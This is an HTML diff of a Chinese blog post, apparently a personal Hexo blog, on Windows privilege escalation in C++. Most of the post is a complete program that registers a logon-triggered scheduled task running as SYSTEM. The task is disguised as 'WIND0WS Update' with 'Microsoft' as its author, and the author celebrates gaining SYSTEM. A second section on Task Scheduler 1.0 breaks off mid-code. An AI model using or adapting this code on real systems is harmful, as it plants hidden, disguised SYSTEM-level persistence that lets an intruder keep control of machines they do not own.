@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="之前在学校的时候打acm用的C++，不过没学过底层的东西。没想到竟然有一天，会拿着C++看算法以外的东西。提到权的那一刻是真爽啊！下面只给了Task Scheduler 2.0的图，其他的图忘记截了&#x3D; &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C++提权的几种方式(win)(一)">
+<meta property="og:url" content="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="之前在学校的时候打acm用的C++，不过没学过底层的东西。没想到竟然有一天，会拿着C++看算法以外的东西。提到权的那一刻是真爽啊！下面只给了Task Scheduler 2.0的图，其他的图忘记截了&#x3D; &#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/cmd.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/jhrw.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/cs.png">
+<meta property="og:image" content="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/job.jpg">
+<meta property="article:published_time" content="2022-02-09T09:32:05.000Z">
+<meta property="article:modified_time" content="2022-12-11T09:31:21.953Z">
+<meta property="article:author" content="ChenZIDu">
+<meta property="article:tag" content="C++">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/cmd.jpg">
+
+<link rel="canonical" href="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>C++提权的几种方式(win)(一) | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Chen'Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          C++提权的几种方式(win)(一)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-09 17:32:05" itemprop="dateCreated datePublished" datetime="2022-02-09T17:32:05+08:00">2022-02-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-11 17:31:21" itemprop="dateModified" datetime="2022-12-11T17:31:21+08:00">2022-12-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/win/" itemprop="url" rel="index">
+                    <span itemprop="name">win</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+<span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">字数统计:</span>
+           <span class="post-count">2.2k(字)</span>
+           
+         </span>
+	  
+      <span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">阅读时长:</span>
+           <span class="post-count">10(分)</span>
+           
+        </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>之前在学校的时候打acm用的C++，不过没学过底层的东西。没想到竟然有一天，会拿着C++看算法以外的东西。提到权的那一刻是真爽啊！下面只给了Task Scheduler 2.0的图，其他的图忘记截了= =</p>
+<a id="more"></a>
+<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><b>Q：Task schduler是什么?</b></p>
+<p>A：Task schduler：任务调度程序，可以理解他的作用跟 Linux 下的 Crontab 作用类似，但是要比 Linux Crontab 强大很多。不单单可以执行定时任务，还可以根据某些特定的条件来启动其他应用，发送电子邮件等任务。</p>
+<p><b>Q：为什么提的权限要是SYSTEM账户?</b></p>
+<p>A：SYSTEM 用户和使用普通管理员用户对于文件有同样的特权。系统帐户可以由 Windows 下执行的服务和操作系统使用。有很多服务和 Windows 进程须要可以在内部登录（比如在 Windows 安装过程中）而系统帐户就是为该目的设计的；它是内部帐户，不显示在用户管理器，也无法加入到不论什么组，而且不能分配用户权限。可是对于一些服务和进程，我们须要使用系统账户而非管理员账户，由于这些服务和进程要和系统交互，须要内部登录。</p>
+<p>在运行计划任务的时候，假设我们使用NT AUTHORITY\SYSTEM 账户，是不须要输入密码的。如果使用了其他管理员账户，我们必须输入密码。一般我们使用系统账户，主要是为了防止管理员改变密码后任务无法运行。</p>
+<hr>
+<p><b>关于计划任务的设定，可以参考这篇文章<a href="https://docs.microsoft.com/zh-cn/windows/win32/taskschd/security-contexts-for-running-tasks" target="_blank" rel="noopener">任务的安全上下文</a>，例如 Administrators 组或 SYSTEM 帐户的成员可以读取、更新、删除和运行任何任务。 “用户”组、LocalService 帐户和 NetworkService 帐户的成员只能读取、更新、删除和运行已创建的任务。</b></p>
+<hr>
+<h1 id="C-Task-Scheduler-2-0提权"><a href="#C-Task-Scheduler-2-0提权" class="headerlink" title="C++ Task Scheduler 2.0提权"></a>C++ Task Scheduler 2.0提权</h1><h3 id="注意：客户端需要-Windows-Vista-或更高版本。服务器需要-Windows-Server-2008-或更高版本。必须要管理员权限才可以运行添加计划任务。"><a href="#注意：客户端需要-Windows-Vista-或更高版本。服务器需要-Windows-Server-2008-或更高版本。必须要管理员权限才可以运行添加计划任务。" class="headerlink" title="注意：客户端需要 Windows Vista 或更高版本。服务器需要 Windows Server 2008 或更高版本。必须要管理员权限才可以运行添加计划任务。"></a>注意：客户端需要 Windows Vista 或更高版本。服务器需要 Windows Server 2008 或更高版本。必须要管理员权限才可以运行添加计划任务。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincred.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;taskschd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"taskschd.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"comsupp.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"credui.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">wmain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化COM</span></span><br><span class="line">    HRESULT hr = CoInitializeEx(<span class="literal">NULL</span>, COINIT_MULTITHREADED);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nCoInitializeEx failed: %x"</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注册安全性并设置该过程的默认安全性值。</span></span><br><span class="line">    hr = CoInitializeSecurity(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">-1</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,</span><br><span class="line">        RPC_C_IMP_LEVEL_IMPERSONATE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line">    LPCWSTR wszTaskName = <span class="string">L"WIND0WS Update"</span>; <span class="comment">//设置计划任务名称</span></span><br><span class="line">    <span class="comment">//创建ITaskService的实例</span></span><br><span class="line">    ITaskService* pService = <span class="literal">NULL</span>;</span><br><span class="line">    hr = CoCreateInstance(CLSID_TaskScheduler,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        CLSCTX_INPROC_SERVER,</span><br><span class="line">        IID_ITaskService,</span><br><span class="line">        (<span class="keyword">void</span>**)&amp;pService);</span><br><span class="line">    <span class="comment">// 链接到任务实例</span></span><br><span class="line">    hr = pService-&gt;Connect(<span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(),</span><br><span class="line">        <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>());</span><br><span class="line">    <span class="comment">//     获取指向根任务文件夹的指针。</span></span><br><span class="line">    ITaskFolder* pRootFolder = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pService-&gt;GetFolder(<span class="keyword">_bstr_t</span>(<span class="string">L"\\"</span>), &amp;pRootFolder);</span><br><span class="line">    <span class="comment">//  如果存在相同的任务删除该任务</span></span><br><span class="line">    pRootFolder-&gt;DeleteTask(<span class="keyword">_bstr_t</span>(wszTaskName), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//  创建任务生成器对象以创建任务。</span></span><br><span class="line">    ITaskDefinition* pTask = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pService-&gt;NewTask(<span class="number">0</span>, &amp;pTask);</span><br><span class="line">    pService-&gt;Release();  <span class="comment">//清理Com</span></span><br><span class="line">    <span class="comment">// 获取注册信息</span></span><br><span class="line">    IRegistrationInfo* pRegInfo = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_RegistrationInfo(&amp;pRegInfo);</span><br><span class="line">    hr = pRegInfo-&gt;put_Author((<span class="keyword">_bstr_t</span>)<span class="string">"Microsoft"</span>);                                <span class="comment">// 修改你想要改的计划任务创建者</span></span><br><span class="line">    <span class="comment">//  创建计划任务设置</span></span><br><span class="line">    ITaskSettings* pSettings = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Settings(&amp;pSettings);</span><br><span class="line">    <span class="comment">//      设置任务的设置值</span></span><br><span class="line">    hr = pSettings-&gt;put_StartWhenAvailable(VARIANT_TRUE);</span><br><span class="line">    pSettings-&gt;Release();</span><br><span class="line">    <span class="comment">//  ------------------------------------------------------</span></span><br><span class="line">    <span class="comment">//  获取取触发器集合以插入登录触发器。</span></span><br><span class="line">    ITriggerCollection* pTriggerCollection = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Triggers(&amp;pTriggerCollection);</span><br><span class="line">    <span class="comment">//  添加触发器</span></span><br><span class="line">    ITrigger* pTrigger = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTriggerCollection-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);   <span class="comment">//TASK_TRIGGER_EVENT    事件触发</span></span><br><span class="line">    pTriggerCollection-&gt;Release();</span><br><span class="line">    ILogonTrigger* pLogonTrigger = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTrigger-&gt;QueryInterface(</span><br><span class="line">        IID_ILogonTrigger, (<span class="keyword">void</span>**)&amp;pLogonTrigger);</span><br><span class="line">    pTrigger-&gt;Release();</span><br><span class="line">    hr = pLogonTrigger-&gt;put_Id(<span class="keyword">_bstr_t</span>(<span class="string">L"Trigger1"</span>));</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //设置指定触发时间 如果不设置 代表任何时间都可以触发</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_StartBoundary( _bstr_t(L"2020-10-30T08:00:00") );</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_EndBoundary( _bstr_t(L"2020-10-30T08:00:00") );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //  定义某个用户 登录时触发 注释掉代表所有用户登录后触发</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_UserId( _bstr_t( L"administrator" ) );   //某用户登录后触发 设置某用户</span></span><br><span class="line"><span class="comment">    pLogonTrigger-&gt;Release();</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    IActionCollection* pActionCollection = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Actions(&amp;pActionCollection);</span><br><span class="line">    IAction* pAction = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pActionCollection-&gt;Create(TASK_ACTION_EXEC, &amp;pAction); <span class="comment">//触发程序执行：TASK_ACTION_EXEC</span></span><br><span class="line">    IExecAction* pExecAction = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pAction-&gt;QueryInterface(</span><br><span class="line">        IID_IExecAction, (<span class="keyword">void</span>**)&amp;pExecAction);</span><br><span class="line">    <span class="built_in">string</span> cmdName;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"输入文件位置：\n"</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; cmdName;</span><br><span class="line">    hr = pExecAction-&gt;put_Path(<span class="keyword">_bstr_t</span>(cmdName.c_str()));</span><br><span class="line">    pExecAction-&gt;Release();</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" 无法设置程序执行路径: %x"</span>, hr);</span><br><span class="line">        pRootFolder-&gt;Release();</span><br><span class="line">        pTask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    IRegisteredTask* pRegisteredTask = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pRootFolder-&gt;RegisterTaskDefinition(</span><br><span class="line">        <span class="keyword">_bstr_t</span>(wszTaskName),</span><br><span class="line">        pTask,</span><br><span class="line">        TASK_CREATE_OR_UPDATE,  <span class="comment">// 创建并覆盖现有的计划任务：TASK_CREATE_OR_UPDATE </span></span><br><span class="line">                                                        <span class="comment">//仅更新：TASK_UPDATE</span></span><br><span class="line">                                                        <span class="comment">//仅创建：TASK_CREATE</span></span><br><span class="line">                                                        <span class="comment">//禁用：TASK_DISABLE</span></span><br><span class="line">        <span class="keyword">_variant_t</span>(<span class="string">L"system"</span>),  <span class="comment">// 启动身份 system 或者administrator </span></span><br><span class="line">        <span class="keyword">_variant_t</span>(),</span><br><span class="line">        TASK_LOGON_GROUP, <span class="comment">//登录技术  组激活：TASK_LOGON_GROUP 用户登录后激活：TASK_LOGON_INTERACTIVE_TOKEN</span></span><br><span class="line">        <span class="keyword">_variant_t</span>(<span class="string">L""</span>),</span><br><span class="line">        &amp;pRegisteredTask);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n无法保存计划任务 : %x"</span>, hr);</span><br><span class="line">        pRootFolder-&gt;Release();</span><br><span class="line">        pTask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Success！成功注册计划任务 "</span>);</span><br><span class="line">    pRootFolder-&gt;Release();</span><br><span class="line">    pTask-&gt;Release();</span><br><span class="line">    pRegisteredTask-&gt;Release();</span><br><span class="line">    CoUninitialize();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行后，把绝对路径输入后，成功提权至system,非常的爽</p>
+<p><img src="cmd.jpg" alt=""></p>
+<p><img src="jhrw.jpg" alt=""></p>
+<p><img src="cs.png" alt="cs"></p>
+<h1 id="C-Task-Scheduler-1-0写入提权（利用COM组件的-API-编程创建计划任务）"><a href="#C-Task-Scheduler-1-0写入提权（利用COM组件的-API-编程创建计划任务）" class="headerlink" title="C++ Task Scheduler 1.0写入提权（利用COM组件的 API 编程创建计划任务）"></a>C++ Task Scheduler 1.0写入提权（利用COM组件的 API 编程创建计划任务）</h1><h3 id="注意：Task-Scheduler-1-0是在C-Windows-Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要-Windows-Vista-或-Windows-XP。服务器需要-Windows-Server-2008-或-Windows-Server-2003。"><a href="#注意：Task-Scheduler-1-0是在C-Windows-Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要-Windows-Vista-或-Windows-XP。服务器需要-Windows-Server-2008-或-Windows-Server-2003。" class="headerlink" title="注意：Task Scheduler 1.0是在C:\Windows\Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要 Windows Vista 或 Windows XP。服务器需要 Windows Server 2008 或 Windows Server 2003。"></a>注意：Task Scheduler 1.0是在C:\Windows\Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要 Windows Vista 或 Windows XP。服务器需要 Windows Server 2008 或 Windows Server 2003。</h3><h3 id="使用-Task-Scheduler-1-0-的几个注意点："><a href="#使用-Task-Scheduler-1-0-的几个注意点：" class="headerlink" title="使用 Task Scheduler 1.0 的几个注意点："></a>使用 Task Scheduler 1.0 的几个注意点：</h3><ul>
+<li>创建计划任务需要管理员权限。</li>
+<li>必须确保 Task Scheduler service 正在运行。</li>
+<li>通过 COM 组件创建的计划任务,会在C:\windows\Tasks目录下创建一个同名的 JOB 文件。</li>
+<li>同时需要为计划任务指定一个唯一的名称，如果指定的名称已被使用，则会导致任务创建失败。</li>
+<li>该计划任务无法通过 schtasks 命令查询。</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 